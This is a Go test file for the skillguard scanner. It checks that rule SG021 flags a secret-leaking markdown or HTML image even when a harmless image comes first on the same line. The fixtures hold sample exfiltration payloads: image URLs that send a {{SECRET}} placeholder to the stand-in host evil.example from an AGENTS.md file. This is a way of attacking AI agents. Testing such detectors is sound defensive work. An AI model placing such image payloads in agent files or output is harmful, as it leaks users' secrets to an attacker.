package scan_test

import (
	"strings"
	"testing"

	"github.com/CrescentKohana/skillguard/internal/scan"
)

// TestSG021ChecksEveryMarkdownImageOnLine verifies "at most one finding per
// rule per line" limits reporting, not detection: a benign image followed by a malicious one still fires.
func TestSG021ChecksEveryMarkdownImageOnLine(t *testing.T) {
	line := "![ok](https://example.com/a.png) ![x](https://evil.example/c?d={{SECRET}})"
	findings := scan.ScanContent("AGENTS.md", scan.KindAgents, []byte(line+"\n"))
	f := findRule(t, findings, "SG021")
	wantCol := strings.Index(line, "![x]") + 1
	if f.Column != wantCol {
		t.Fatalf("SG021 column = %d, want %d: the earliest offending image, not the first (benign) image on the line", f.Column, wantCol)
	}
}

// TestSG021ChecksEveryHTMLImgOnLine is the equivalent ordering case for <img>.
func TestSG021ChecksEveryHTMLImgOnLine(t *testing.T) {
	line := `<img alt="ok" src="https://example.com/a.png"> <img alt="x" src="https://evil.example/c?d={{SECRET}}">`
	findings := scan.ScanContent("AGENTS.md", scan.KindAgents, []byte(line+"\n"))
	f := findRule(t, findings, "SG021")
	wantCol := strings.Index(line, `<img alt="x"`) + 1
	if f.Column != wantCol {
		t.Fatalf("SG021 column = %d, want %d: the earliest offending <img>, not the first (benign) <img> on the line", f.Column, wantCol)
	}
}
